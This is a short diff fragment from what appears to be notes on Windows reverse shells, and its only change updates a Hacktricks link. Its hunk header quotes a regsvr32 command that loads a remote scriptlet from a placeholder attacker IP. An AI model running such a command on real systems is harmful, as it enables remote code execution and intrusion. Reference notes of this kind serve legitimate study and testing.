@@ -61,7 +61,7 @@ C:\> regsvr32.exe /s /u /i:\\<attacker_IP>\@snare scrobj.dll
 
 ### Hacktricks
 
-- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells/windows)
+- [Hacktricks: Windows Reverse Shells](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/windows.html)
 
 ### Red Team Notes
 
